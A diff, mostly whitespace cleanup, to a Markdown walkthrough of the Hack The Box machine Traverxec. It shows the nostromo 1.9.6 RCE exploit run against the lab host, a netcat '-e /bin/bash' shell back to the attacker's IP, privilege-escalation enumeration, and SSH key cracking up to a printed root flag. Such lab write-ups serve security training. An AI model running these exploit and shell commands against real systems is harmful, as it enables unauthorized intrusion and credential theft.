@@ -20,7 +20,7 @@ Credits: S/o to tedd_918, hunterbot for the assist.
 
 :::tip
 
-1. enumerating the system thoroughly and methodically is imperative e.g. `sudo -l`, `find -user <username>` (for files owned)
+1. enumerating the system thoroughly and methodically is imperative e.g. `sudo -l`, `find -user <username />` (for files owned)
 2. learn and document cracking techniques to speed things up e.g. hashcat, ssh2john (new to me)
 3. get better at ssh key vector techniques e.g. how to find keys, crack keys, use keys
 
@@ -35,14 +35,14 @@ run it all: `sudo nmap -v 10.10.10.165 -Pn -p- -sC -sV -O --min-rate=5000 -o nma
 ```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
 |   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
 |_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
 80/tcp open  http    nostromo 1.9.6
 |_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
 |_http-title: TRAVERXEC
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST
 |_http-server-header: nostromo 1.9.6
 ```
@@ -66,7 +66,7 @@ Shellcodes: No Results
 Pull it down:
 
 ```bash
-└─$ searchsploit -m 47837      
+└─$ searchsploit -m 47837
   Exploit: nostromo 1.9.6 - Remote Code Execution
       URL: https://www.exploit-db.com/exploits/47837
      Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
@@ -106,7 +106,7 @@ Test it out, and I can get remote command execution on the target:
 └─$ python3 ./nostroSploit.py
 usage: nostroSploit.py [-h] host port [cmd]
 nostroSploit.py: error: the following arguments are required: host, port
-                                                                                                                   
+
 ┌──(rxhackk㉿kali)-[~/…/HTB/BOXES/TRAVERXEC/exploit]-[tun0: 10.10.16.2]
 └─$ python3 ./nostroSploit.py 10.10.10.165 80 whoami
 [+] Connecting to target
@@ -128,7 +128,7 @@ We get a bind shell from the target back to  our attack host:
 
 ```bash
 ┌──(rxhackk㉿kali)-[~/…/HTB/BOXES/TRAVERXEC/exploit]-[tun0: 10.10.16.2]
-└─$ python3 ./nostroSploit.py 10.10.10.165 80 "nc 10.10.16.2 443 -e /bin/bash"                                
+└─$ python3 ./nostroSploit.py 10.10.10.165 80 "nc 10.10.16.2 443 -e /bin/bash"
 [+] Connecting to target
 [+] Sending malicious payload
 ```
@@ -144,7 +144,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 which python
 /usr/bin/python
 python -c 'import pty; pty.spawn("/bin/bash")'
-www-data@traverxec:/usr/bin$ 
+www-data@traverxec:/usr/bin$
 ```
 
 ## LINUX ENUMERATION
@@ -152,15 +152,15 @@ www-data@traverxec:/usr/bin$
 I try these manual find lines first for various vulnerable file types:
 
 ```bash
-#World writable files directories 
+#World writable files directories
 find / -writable -type d 2>/dev/null
-find / -perm -222 -type d 2>/dev/null 
-find / -perm -o w -type d 2>/dev/null 
+find / -perm -222 -type d 2>/dev/null
+find / -perm -o w -type d 2>/dev/null
 
-# World executable folder 
-find / -perm -o x -type d 2>/dev/null 
+# World executable folder
+find / -perm -o x -type d 2>/dev/null
 
-# World writable and executable folders 
+# World writable and executable folders
 
 find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
 ```
@@ -185,38 +185,38 @@ $ find / -perm /4000
 
 ### linpeas
 
-From my attack host I do a `sudo python3 http.server 80` where my tools are, and then `wget` it from my reverse shell. 
+From my attack host I do a `sudo python3 http.server 80` where my tools are, and then `wget` it from my reverse shell.
 
 I run `linpeas.sh`
 
 ```bash
-╔══════════╣ SUID - Check easy privesc, exploits and write perms           
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                        
-strings Not Found                                                                                                  
-strace Not Found                                                                                                   
--rwsr-xr-x 1 root root 427K Oct  6  2019 /usr/lib/openssh/ssh-keysign                                              
--r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper                       
--r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper                       
--rwsr-xr-- 1 root messagebus 50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                          
--rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device                                          
--rwsr-xr-x 1 root root 154K Oct 12  2019 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable              
--rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)                                  
--rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su                                                                
--rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd                                                           
--rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20                                         
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+strings Not Found
+strace Not Found
+-rwsr-xr-x 1 root root 427K Oct  6  2019 /usr/lib/openssh/ssh-keysign
+-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-rwsr-xr-- 1 root messagebus 50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 154K Oct 12  2019 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
+-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
 -rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1
-699.24.8                                                                                                           
--rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh                                                              
+699.24.8
+-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
 -rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/
-9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                
--rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10  
+9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
 ```
 
 this looks interesting:
 
 ```bash
-╔══════════╣ Analyzing Htpasswd Files (limit 70)                                                                   
--rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd                                                 
+╔══════════╣ Analyzing Htpasswd Files (limit 70)
+-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd
 david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
 ```
 
@@ -253,17 +253,17 @@ I try `su - david` and `ssh david@10.10.10.165`, but this password doesn't work 
 Run linpeas again and see what else I can find:
 
 ```bash
-╔══════════╣ Executing Linux Exploit Suggester                                                                                                                                                                                                
-╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                            
-cat: write error: Broken pipe                                                                                                                                                                                                                 
-cat: write error: Broken pipe                                                                                                                                                                                                                 
-[+] [CVE-2019-13272] PTRACE_TRACEME                                                                                                                                                                                                           
-                                                                                                                                                                                                                                              
-   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903                                                                                                                                                                    
-   Exposure: highly probable                                                                                                                                                                                                                  
-   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}                                                                                        
-   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip                                                                                                                                 
-   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c                                                                                                                                              
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester
+cat: write error: Broken pipe
+cat: write error: Broken pipe
+[+] [CVE-2019-13272] PTRACE_TRACEME
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
+   Exposure: highly probable
+   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
+   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
    Comments: Requires an active PolKit agent.
 ```
 
@@ -272,8 +272,8 @@ cat: write error: Broken pipe
 So, after few hints from Tedd in chat, I review `/var/nostromo/conf/` folder, and in the config file it has this:
 
 ```bash
-# HOMEDIRS [OPTIONAL]                                                                                                 
-                                                                                                                      
+# HOMEDIRS [OPTIONAL]
+
 homedirs                /home
 homedirs_public         public_www
 ```
@@ -313,8 +313,8 @@ From `/home/david/public_www` folder we found a backup of the users ssh keys.
 Copy *.tgz to /tmp and then untar
 
 ```bash
-tar xvf backup-ssh-identity-files.tgz 
-tar xvf backup-ssh-identity-files.tgz 
+tar xvf backup-ssh-identity-files.tgz
+tar xvf backup-ssh-identity-files.tgz
 home/david/.ssh/
 home/david/.ssh/authorized_keys
 home/david/.ssh/id_rsa
@@ -347,7 +347,7 @@ re-try ssh, with the cracked `.htpasswd` passphrase:
 
 ```bash
 708 💀 ± ➤ ssh -i ./id_rsa david@10.10.10.165
-Enter passphrase for key './id_rsa': 
+Enter passphrase for key './id_rsa':
 Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
 david@traverxec:~$
 ```
@@ -372,10 +372,10 @@ uid=0(root) gid=0(root) groups=0(root)
 # whoami
 root
 #
-# cd /root  
+# cd /root
 # ls
 nostromo_1.9.6-1.deb  root.txt
 # cat root.txt
 9aa36a6d76f785dfd320a478f6e0d906
-#  
+#
 ```
